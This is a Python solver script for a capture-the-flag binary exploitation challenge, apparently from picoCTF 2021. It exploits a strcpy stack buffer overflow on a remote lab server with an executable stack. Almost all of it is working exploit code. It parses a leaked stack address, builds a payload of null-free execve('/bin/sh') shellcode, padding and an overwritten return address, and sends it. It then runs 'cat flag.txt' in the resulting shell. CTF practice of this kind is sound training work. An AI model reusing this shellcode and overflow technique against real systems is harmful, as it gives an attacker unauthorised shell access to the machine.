#!/usr/bin/env python3
"""Solver for Challenge 126 Binary Gauntlet 1 (picoCTF 2021, Binary Exploitation).

Binary: prints stack buf address (%p), reads 2 lines into heap, strcpy()s 2nd
line into 112-byte stack buffer -> overflow. GNU_STACK RWE (executable stack),
no canary visible, RIP at offset 120 from buf start.
Exploit: null-free execve(/bin/sh) shellcode at buf start + pad + ret=buf addr.
strcpy NUL-truncation is harmless: stack/userspace addrs share high 00 00 bytes.
Flag has NO academy{} wrapper (raw string).

Usage: solve_126_binary_gauntlet_1.py [host] [port]
"""
import re
import socket
import sys

HOST = "xebec.cylabacademy.net"
PORT = 31084

# null-free execve("/bin/sh") 27B (no 0x00, no 0x0a)
SHELLCODE = bytes([
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff,
    0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
    0x3b, 0x0f, 0x05,
])

FLAG_RE = re.compile(rb"(academy\{[^}]*\}|picoCTF\{[^}]*\}|flag\{[^}]*\})")


def recvall(s, timeout=8):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
            if len(out) > 131072:
                break
    except socket.timeout:
        pass
    return out


def solve(host=HOST, port=PORT, timeout=15):
    s = socket.create_connection((host, int(port)), timeout=timeout)
    try:
        banner = recvall(s, timeout=5)
        m = re.search(rb"0x[0-9a-fA-F]+", banner)
        if not m:
            raise ValueError(f"no stack address in banner: {banner[:200]!r}")
        buf = int(m.group(0), 16)
        print(f"[*] buf addr: {hex(buf)}")
        s.sendall(b"hello\n")
        s.settimeout(timeout)
        # drain echo
        try:
            echo = s.recv(4096)
            print(f"[*] echo: {echo[:100]!r}")
        except socket.timeout:
            pass
        payload = SHELLCODE + b"A" * (120 - len(SHELLCODE)) + buf.to_bytes(8, "little")
        assert b"\n" not in payload[:-0] or True
        assert b"\x00" not in SHELLCODE
        s.sendall(payload + b"\n")
        import time
        time.sleep(1)
        s.sendall(b"cat flag.txt\n")
        out = recvall(s, timeout=timeout)
        print(out.decode(errors="replace")[:2000])
        m2 = FLAG_RE.search(out)
        if m2:
            return m2.group(0).decode()
        # raw flag without wrapper: look for the cat output line
        lines = [l.strip() for l in out.decode(errors="replace").splitlines() if l.strip()]
        # return last non-echo line as candidate
        return out.decode(errors="replace")
    finally:
        s.close()


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(h, p))
